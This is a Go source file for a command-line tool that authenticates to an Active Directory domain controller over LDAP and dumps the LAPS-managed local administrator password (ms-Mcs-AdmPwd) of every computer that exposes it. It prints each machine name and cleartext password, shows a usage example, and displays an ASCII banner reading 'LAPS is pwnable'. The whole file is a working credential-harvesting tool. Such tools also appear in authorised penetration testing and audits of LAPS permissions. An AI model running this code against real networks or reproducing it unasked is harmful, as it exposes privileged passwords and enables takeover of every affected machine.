package main

import "os"
import "fmt"
import "flag"
import "strings"
import "encoding/base64"
import "gopkg.in/ldap.v2"
import "github.com/fatih/color"

func error(err interface{}) {
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
}

func frescura(){
    fmt.Print("[")
    color.Set(color.FgGreen)
    fmt.Print("+")
    color.Set(color.FgWhite)
    fmt.Print("]")
}

func conx(host, dsname, senha, dsdc , dominio string, porta int) {

	frescura()
	fmt.Printf(" %s  \n[!] Trying to connect on %s:%d\n", dsname, host, porta)

	l, err := ldap.Dial("tcp", fmt.Sprintf("%s:%d", host, porta))
	error(err)

	defer l.Close()
	
	err = l.Bind(dsname, senha)
	error(err)

	frescura()
	fmt.Println(" Connection successfully.")

	attributes := []string{ "dNSHostName", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime" }
	filter := "(&(objectCategory=Computer))"

	searchRequest := ldap.NewSearchRequest( dsdc, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, filter, attributes, nil )

	sra, err := l.Search(searchRequest)
	error(err)

	for _, entry := range sra.Entries {
		if len(entry.GetAttributeValue("ms-Mcs-AdmPwd")) > 0 {
			data := []string{
				entry.GetAttributeValue("dNSHostName"),
				entry.GetAttributeValue("ms-Mcs-AdmPwd"),
				entry.GetAttributeValue("ms-Mcs-AdmPwdExpirationTime"),
			}
			retirar := fmt.Sprintf(".%s", dominio)
			retirar2 := strings.Replace(data[0], retirar, "",-1)
			fmt.Printf("\n.: Machine => %s\n.: Password => %s\n", retirar2, data[1])
		} else{
			fmt.Print("[")
			color.Set(color.FgRed)
			fmt.Print("!")
			color.Set(color.FgWhite)
			fmt.Print("] Could not filter ms-Mcs-AdmPwd.\n")
		}
	}
}

func main() {
	var (
		usuario string
		senha string
		host string
		porta int
	)

	ascii := "ICBBX0EKICgtLi0pICAgTEFQUyBpcyBwd25hYmxlCiAgfC18CiAvICAgXAp8ICAgICB8ICAgX18KfCAgfHwgfCAgfCAgXF9fCiBcX3x8Xy9fLw=="
	b64, _ := base64.StdEncoding.DecodeString(ascii)
	fmt.Println("\n" + string(b64) + "\n")

	flag.StringVar(&usuario, "u", "", "a valid domain user")
	flag.StringVar(&senha, "p", "", "a valid domain user's password")
	flag.StringVar(&host, "h", "", "domain controller IP")
	flag.IntVar(&porta, "port", 389, "port for ldap connection")
	dominio := flag.String("d", "", "a valid AD domain name")
	flag.Parse()

	if len(usuario) == 0 || len(senha) == 0  || len(*dominio) == 0  || len(host) == 0{
		fmt.Println("\n>> Example of usage: \n >> ./laps.exe -u user -p pass123 -d domain.local -h 127.0.0.1")
		os.Exit(0)
	}

	dsdc := "DC=" + strings.Replace(*dominio, ".", ",DC=", -1)
	dsname := fmt.Sprintf("CN=%s,CN=Users,%s", usuario, dsdc)

	conx(host, dsname, senha, dsdc, *dominio, porta)
}
